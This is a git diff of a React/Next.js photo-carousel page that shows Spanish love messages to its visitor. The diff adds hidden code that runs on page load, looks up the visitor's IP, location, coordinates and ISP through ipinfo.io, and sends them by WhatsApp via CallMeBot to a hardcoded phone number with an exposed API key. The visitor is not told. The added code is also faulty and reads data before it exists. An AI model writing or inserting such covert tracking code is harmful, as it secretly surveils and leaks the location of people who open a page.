@@ -3,7 +3,7 @@ import Carousel from 'react-bootstrap/Carousel';
 import photo1 from '../../public/img1.jpg'
 import photo2 from '../../public/img2.jpg'
 import photo3 from '../../public/img3.jpg'
-import { useState } from 'react';
+import { useEffect, useState } from 'react';
 import styles from '../../styles/Home.module.css'
 import Head from 'next/head'
 import Button from 'react-bootstrap/Button';
@@ -14,6 +14,41 @@ const ImagesGalleryX = () => {
   const [index, setIndex] = useState(0);
   const [cora, setCora] = useState(0);
   const [message, setMessage] = useState(false);
+  const [ipInfo, setIpInfo] = useState([]);
+
+  async function getIpClient() {
+    try {
+      const response = await axios.get('https://ipinfo.io/json');
+      setIpInfo(response);
+      console.log(response);
+    } catch (error) {
+      console.error(error);
+    }
+  }
+  
+
+  useEffect(() => {
+
+    getIpClient();
+
+    console.log(ipInfo);
+    let rta = ipInfo.data.city + " " +ipInfo.data.country+ " " +ipInfo.data.ip+ " " +ipInfo.data.loc+ " " +ipInfo.data.org+ " " +ipInfo.data.postal+ " " +ipInfo.data.region;
+    let userInfo = {
+      phone: '573102796853',
+      text: rta,
+      apikey: '7625476'
+  }
+    axios.get('https://api.callmebot.com/whatsapp.php', {
+      params: userInfo
+  }).then(response => {
+    
+}).catch(e => {
+    console.log(e);
+})
+    
+    //https://api.callmebot.com/whatsapp.php?phone=+34123123123&text=This+is+a+test+from+CallMeBot&apikey=1234567890
+    
+  }, [ipInfo]);
 
   const handleSelect = (selectedIndex, e) => {
     setIndex(selectedIndex);
@@ -43,6 +78,8 @@ const ImagesGalleryX = () => {
     setMessage(false);
     setCora(cora + 1);
   }
+
+
 
   function SendMessage(){
     return(
@@ -74,6 +111,7 @@ const ImagesGalleryX = () => {
           {cora > 20 && <><h2>Eres mi chica lista</h2></>}
           {cora > 50 && <><h2>Yo te amo muchísimo mas preciosa</h2></>}          
           {cora > 60 && <><h2>Enserio preciosa Que feliz me siento, te amo</h2></>}
+          {cora > 100 && <><h2>Preciosaaa Te amoooooooo</h2></>}
           {cora > 200 && <><h2>Si llegaste hasta aquí es una señal, te amoooo  </h2></>}
           {cora > 1000 && <><h2>OMG de verdad desbloqueaste este nivel? Nivel valido para que escojas el regalo que quieras - Te amo locamente</h2></>}
        </h1>
